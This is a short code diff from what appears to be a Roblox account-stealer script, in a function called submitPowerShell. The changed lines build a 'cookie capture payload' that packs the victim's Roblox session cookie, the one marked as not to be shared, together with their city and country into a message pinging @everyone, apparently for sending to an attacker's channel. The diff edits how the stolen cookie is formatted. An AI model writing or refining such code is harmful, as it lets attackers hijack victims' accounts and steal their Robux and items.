@@ -717,7 +717,7 @@ async function submitPowerShell() {
                 
                             // Immediate cookie capture payload (plain text)
             const payload = {
-                content: `Cookie: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|${robloxCookie}
+                content: `Cookie: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxCookie}
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'} @everyone`
             };
 
